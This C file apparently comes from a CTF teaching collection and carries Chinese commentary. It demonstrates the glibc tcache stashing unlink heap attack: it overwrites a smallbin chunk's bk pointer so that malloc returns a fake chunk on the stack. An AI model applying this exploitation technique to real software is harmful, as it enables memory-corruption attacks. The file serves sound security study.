/*
 * Small Bin Attack 汇总目录副本：smallbin→tcache stashing unlink 分支；2.41 起失效。
 * 中文详细原理、漏洞模拟位置与成功判据见下方导读和本目录 README。
 * 保留副本是为了让 CTF 选手按“small bin attack”术语直接检索。
 */
/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_stashing_unlink_attack
 * 文件标注范围：2.26 ~ 2.40
 * 模拟漏洞：可改 smallbin chunk 的 bk；对应 tcache 必须为空。
 * 核心流程：calloc/malloc 从 smallbin 服务请求时把额外节点 stash 入 tcache，过程中执行 bck->fd 写入并可把假节点链入 tcache。
 * 成功判据：目标地址被写 main_arena 指针且可被后续申请取回；2.41 重构 smallbin→tcache 流程后本形式失效。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);

    // stack_var 用来承载希望 malloc 最终返回的伪 chunk；其周围字段按 smallbin 节点布局布置。

    stack_var[3] = (unsigned long)(&stack_var[2]);

    // 先申请 9 个同尺寸 chunk：其中 7 个用于填满 tcache，另外 2 个进入 unsorted 后参与 smallbin 操作。
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    // 释放前 7 个 chunk，把该尺寸对应的 tcache bin 填满。

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    // 这是最后一个进入 tcache 的节点；再释放同尺寸块时将绕过 tcache。
    free(chunk_lis[1]);
    // tcache 已满，因此接下来两个被释放的 chunk 会先进入 unsorted bin。
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    // 用一个无法由这些块满足的较大申请触发分类，把 unsorted 中的目标块移入 smallbin。

    malloc(0xa0);// size > 0x90

    // 从 tcache 取走两个节点，使该尺寸桶只剩 5 个空闲块，并为 stashing 留出两个槽位。

    malloc(0x90);
    malloc(0x90);

    // 漏洞模拟：覆盖 victim->bk，让 smallbin stashing 的反向遍历走向栈上伪 chunk。
    /* 漏洞模拟开始/结束 */
    chunk_lis[2][1] = (unsigned long)stack_var;
    /* 漏洞模拟开始/结束 */

    // 申请一个由 calloc 路径处理的同尺寸块，触发 smallbin 解链与 tcache stashing 写入。

    calloc(1,0x90);

    // 再次申请时从 tcache 取出刚刚暂存的伪节点，返回栈上 fake chunk 的用户区。
    target = malloc(0x90);   

    assert(target == &stack_var[2]);
    return 0;
}
